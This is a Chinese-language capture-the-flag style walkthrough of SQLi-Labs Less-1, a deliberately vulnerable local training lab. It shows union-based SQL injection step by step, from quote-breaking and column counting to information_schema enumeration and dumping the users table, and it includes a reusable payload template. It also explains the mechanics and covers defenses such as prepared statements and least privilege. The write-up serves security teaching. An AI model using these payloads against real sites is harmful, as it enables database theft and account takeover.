# SQLi-Labs Less-1 联合注入 通关笔记

> Less-1 是 sqli-labs 的第一关，也是最基础的一关。
>
> **一句话：让数据库把 users 表里的账号密码，直接打印在页面上。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | SQLi-Labs |
| 关卡 | Less-1 (Error Based - String) |
| 地址 | `http://localhost/sqli-labs/Less-1/` |
| 参数 | `id`（GET） |
| 类型 | 字符型注入（单引号闭合） |
| 目标 | 从 `security.users` 表里读出用户名和密码 |

> 这一关没有输入框，参数直接拼在地址栏后面：`?id=1`

---

## 二、我的解题步骤

### 步骤 1：先正常查询

```
http://localhost/sqli-labs/Less-1/?id=1
```

页面返回：

```
Your Login name:Dumb
Your Password:Dumb
```

**说明 `id` 被带进了 SQL 查询。**

### 步骤 2：加单引号，让它报错

```
http://localhost/sqli-labs/Less-1/?id=1'
```

页面报错：

```
You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

**注意 `''1''` 这一段：**

| 字符 | 来源 |
| --- | --- |
| 第 1 个 `'` | 后台代码里的引号 |
| `1` | 我的输入 |
| 第 2 个 `'` | 我加的单引号 |
| 第 3 个 `'` | 后台代码里闭合的引号 |

**说明后台的写法是 `id='$id'`，而且没有过滤单引号。**

### 步骤 3：闭合引号 + 注释

```
http://localhost/sqli-labs/Less-1/?id=1' --+
```

页面恢复正常，又出现 `Dumb`。

### 步骤 4：数一共有几列

```
?id=1' order by 3 --+     → 正常
?id=1' order by 4 --+     → 报错 Unknown column '4' in 'order clause'
```

**得出结论：表里一共 3 列。**

### 步骤 5：找哪几列会显示在页面上

```
?id=-1' union select 1,2,3 --+
```

页面显示：

```
Your Login name:2
Your Password:3
```

**第 2、3 列会回显，第 1 列不显示。**

### 步骤 6：爆出数据库名

```
?id=-1' union select 1,database(),version() --+
```

页面显示：

```
Your Login name:security
Your Password:5.7.26
```

### 步骤 7：爆出所有表名

```
?id=-1' union select 1,group_concat(table_name),3
from information_schema.tables where table_schema=database() --+
```

页面显示：

```
Your Login name:emails,referers,uagents,users
```

**目标表是 `users`。**

### 步骤 8：爆出 users 表的字段名

```
?id=-1' union select 1,group_concat(column_name),3
from information_schema.columns where table_name='users' --+
```

页面显示：

```
Your Login name:id,username,password
```

### 步骤 9：取出所有账号密码

```
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

页面显示：

```
Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,
secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,
admin:admin,admin1:admin1,admin2:admin2,admin3:admin3
```

**整个用户表被拖出来了。**

### 步骤 10：用拿到的账号登录

拿 `admin` / `admin` 直接登录后台，通关。

---

## 三、原理分析

### 3.1 核心概念：值区与代码区

这是理解 SQL 注入最重要的一张图。

后台的 SQL 模板是：

```sql
SELECT * FROM users WHERE id = ' ___ ' LIMIT 0,1
                                 ^^^^^
                              我的输入
```

**注意这里有两条分界线：**

```
SELECT * FROM users WHERE id = ' .......... ' LIMIT 0,1
                               ^^^^^^^^^^^^   ^^^^^^^^^^^^
                                  值区            代码区
```

| 区域 | 位置 | 数据库怎么理解 |
| --- | --- | --- |
| **值区** | 两个单引号**之间** | 这是**数据**（一个字符串），写得再花也是字符串 |
| **代码区** | 单引号**外面** | 这是**语法**（SQL 指令），会被执行 |

**关键结论：**

> **我的输入从头到尾都是"代码的一部分"——它被拼进了 SQL 文本里。**
> **有没有引号都是这样。引号的作用只是决定：我待在"值区"还是"代码区"。**

**SQL 注入的核心操作就一句话：**

> **把引号提前关掉，然后站到引号外面写字。**

### 3.2 四种输入的完整对比

| 我输入 | 拼出来的 SQL | 数据库的理解 | 结果 |
| --- | --- | --- | --- |
| `1` | `... id = '1' LIMIT 0,1` | id 等于字符串 `"1"` | 正常，返回 Dumb |
| `1'` | `... id = '1'' LIMIT 0,1` | 两个引号挨在一起，语法错误 | 报错 `near ''1''` |
| `1' --+` | `... id = '1' -- ' LIMIT 0,1` | id 等于 1，后面被注释 | 正常，返回 Dumb |
| `1' union select 1,2,3 --+` | `... id = '1' union select 1,2,3 -- '` | 两条查询合并，后面的 `'` 被注释 | 页面显示 2 和 3 |

### 3.3 逐个拆开看

#### 情况一：输入 `1`

```sql
SELECT * FROM users WHERE id = '1' LIMIT 0,1
                               ^^^
                            我整个待在值区里
```

数据库眼里它就是一个字符串 `"1"`，去匹配 `id` 字段。

**这就是普通人正常使用的情况。**

#### 情况二：输入 `1'`

```sql
SELECT * FROM users WHERE id = '1'' LIMIT 0,1
                               ^^^^
                          值区提前关闭了
```

我的 `'` 把值区关掉了，但后面紧跟着后台自己的 `'`。

**两个引号撞在一起 → 语法错误。**

这一步的意义不是"注入成功"，而是：

> **我知道了值区的边界在哪。**

#### 情况三：输入 `1' --+`

```sql
SELECT * FROM users WHERE id = '1' --+ ' LIMIT 0,1
                               ^^^   ^^^^^^^^^^^^^^^
                              值区      被注释掉
```

**`--` 是 MySQL 的注释符**（后面必须跟空格，URL 里用 `+` 表示空格）。

它让后面所有内容——包括那个多余的引号——全部失效。

**引号配对恢复，语法正确。**

#### 情况四：输入 `1' union select 1,2,3 --+`

```sql
SELECT * FROM users WHERE id = '1' UNION SELECT 1,2,3 --+ ' LIMIT 0,1
                                   ^^^^^^^^^^^^^^^^^^^
                                     我写的代码
```

**现在我站在代码区了，写的东西会被当 SQL 指令执行。**

`UNION` 会把第二条查询的结果拼到第一条后面，于是页面上出现了 `2` 和 `3`。

### 3.4 为什么 `--+` 里的 `+` 是必须的

MySQL 规定 `--` 注释后面**必须跟一个空白字符**，否则不生效。

```
-- 后面直接跟字母  →  不生效
-- 后面跟空格      →  生效
```

但 URL 里不能直接写空格，所以用 `+` 代替（标准 URL 编码里 `+` 解码成空格）。

**等价写法：**

| 写法 | 说明 |
| --- | --- |
| `--+` | 最常用 |
| `--%20` | `%20` 也是空格 |
| `%23` | `#` 的编码，`#` 也是 MySQL 注释符 |

> `#` 不能直接写在地址栏，因为浏览器会把它当成锚点，不发给服务器。

### 3.5 为什么用 `order by` 数

```sql
SELECT * FROM users WHERE id='1' ORDER BY 3
```

`ORDER BY 3` 表示"按第 3 列排序"。

| 语句 | 结果 | 说明 |
| --- | --- | --- |
| `order by 3` | 正常 | 有第 3 列 |
| `order by 4` | 报 `Unknown column '4'` | 没有第 4 列 |

**报错的数字减 1 = 总列数。**

知道列数是为了下一步 `union`——它要求前后两个查询**列数必须一致**。

### 3.6 为什么 `union` 要求列数相同

```sql
SELECT id,username,password FROM users WHERE id='1'
UNION
SELECT 1,2,3
```

`UNION` 是把两个结果集**上下拼接**，列必须一一对应。

列数不一致直接报错：

```
The used SELECT statements have a different number of columns
```

### 3.7 为什么用 `id=-1`

```sql
-- id=1 时
第一行：Dumb / Dumb     ← 原生查询的结果
第二行：2 / 3           ← union 的结果

-- id=-1 时（数据库里没有 -1 这个用户）
第一行：2 / 3           ← 只剩 union 的结果
```

**原查询查不到数据，页面上就只剩我注入的内容，干净清楚。**

### 3.8 `information_schema` 是什么

MySQL 5.0+ 自带的**元数据库**，存着所有库、表、字段的名字。

| 表 | 存什么 | 关键字段 |
| --- | --- | --- |
| `information_schema.tables` | 所有表 | `table_schema`（库名）、`table_name`（表名） |
| `information_schema.columns` | 所有字段 | `table_name`、`column_name` |

**读这两张表，就能画出整个数据库的结构图。**

### 3.9 为什么用 `group_concat()`

```sql
SELECT username FROM users;   -- 返回 8 行
```

但页面**只显示 1 行**（`LIMIT 0,1` + 页面模板只渲染一次）。

`group_concat()` 把多行拼成一行：

```
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,...
```

**一次拿全。**

### 3.10 `0x3a` 是什么

`0x3a` 是冒号 `:` 的十六进制。

```sql
group_concat(username,0x3a,password)
-- 等价于
group_concat(username,':',password)
```

**用十六进制是为了少写一层引号**，避免把 SQL 搞乱。

---

## 四、知识点与笔记

### 4.1 判断注入类型

| 测试 | 结果 | 结论 |
| --- | --- | --- |
| `?id=1'` | 报错 | 有字符包裹 |
| `?id=1' --+` | 恢复 | 单引号闭合，`--` 可用 |
| `?id=1 --+` | 正常 | 可能是数字型（不用引号） |

### 4.2 常见闭合方式

| 后台写法 | 闭合 payload |
| --- | --- |
| `id='$id'` | `1'` |
| `id="$id"` | `1"` |
| `id=($id)` | `1)` |
| `id=('$id')` | `1')` |
| `id=("$id")` | `1")` |
| `id=$id` | `1`（数字型，不用闭合） |

### 4.3 注释符对照

| 写法 | 说明 |
| --- | --- |
| `-- ` | SQL 注释，**后面必须有空格** |
| `--+` | URL 写法（`+` 解码成空格） |
| `#` | MySQL 注释，URL 里要写 `%23` |
| `/* */` | 块注释 |

### 4.4 常用函数

| 函数 | 作用 | 例子 |
| --- | --- | --- |
| `database()` | 当前库名 | `security` |
| `version()` | 数据库版本 | `5.7.26` |
| `user()` | 当前用户 | `root@localhost` |
| `group_concat()` | 多行拼一行 | |
| `concat()` | 拼接 | `concat(a,0x3a,b)` |
| `load_file()` | 读文件 | 需要 FILE 权限 |

### 4.5 完整利用模板

```sql
-- 1. 库名
?id=-1' union select 1,database(),3 --+

-- 2. 表名
?id=-1' union select 1,group_concat(table_name),3
from information_schema.tables where table_schema=database() --+

-- 3. 字段名
?id=-1' union select 1,group_concat(column_name),3
from information_schema.columns where table_name='users' --+

-- 4. 数据
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users --+
```

**这四句是固定套路，换个库名/表名就能用。**

---

## 五、和其他注入类型的区别

| 类型 | 前提 | 能直接看结果吗 |
| --- | --- | --- |
| **联合注入（本题）** | 有回显位 + 有报错 | 能 |
| 报错注入 | 有报错信息，但没回显位 | 借报错带出 |
| 布尔盲注 | 只能看到"对/错" | 要一位一位猜 |
| 时间盲注 | 连对错都看不出来 | 靠响应时间猜 |

**联合注入是最舒服的，因为它"有地方显示"。**

---

## 六、防御怎么写

### 6.1 预编译（根本解）

```php
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ? LIMIT 0,1");
$stmt->bind_param('i', $id);
$stmt->execute();
```

**`?` 占位符会把输入当纯数据，无论输入什么都不会变成 SQL 语法。**

**这才是"把用户永远锁在值区里"的办法。**

### 6.2 类型转换

```php
$id = intval($_GET['id']);
$sql = "SELECT * FROM users WHERE id = $id LIMIT 0,1";
```

**数字型参数直接转整数，`1'` 会变成 `1`。**

### 6.3 不显示报错

```php
// php.ini
display_errors = Off
```

**报错会暴露表结构、字段名、SQL 写法——这是攻击者最好的老师。**

### 6.4 最小权限

```sql
GRANT SELECT, INSERT ON app_db.* TO 'app'@'localhost';
```

**即使被注入，也读不到别的库。**

### 6.5 不存明文密码

```php
$hash = password_hash($password, PASSWORD_DEFAULT);
```

**本题的密码全是明文，一拖库就全暴露。**

---

## 七、总结

### 九步流程

| 步骤 | payload | 得到什么 |
| --- | --- | --- |
| 1 | `?id=1'` | 报错，确认单引号闭合 |
| 2 | `?id=1' --+` | 恢复，确认注释可用 |
| 3 | `order by 3 / 4` | 3 列 |
| 4 | `union select 1,2,3` | 回显位 2、3 |
| 5 | `database()` | `security` |
| 6 | `information_schema.tables` | `users` |
| 7 | `information_schema.columns` | `id,username,password` |
| 8 | `from users` | 全部账号密码 |
| 9 | 用 admin/admin 登录 | 通关 |

### 一句话

> **SQL 注入的本质，是让"数据"越界变成了"代码"。**
>
> **引号是边界：引号内是数据，引号外是代码。**
> **闭合引号 = 把话说完整；注释 = 让后面闭嘴；union = 在页面上开一扇窗。**

---

## 参考

- [sqli-labs GitHub](https://github.com/Audi-1/sqli-labs)
- [sqli-labs php7 兼容版](https://github.com/happygongzhuo/sqli-labs-php7)
- [OWASP: SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
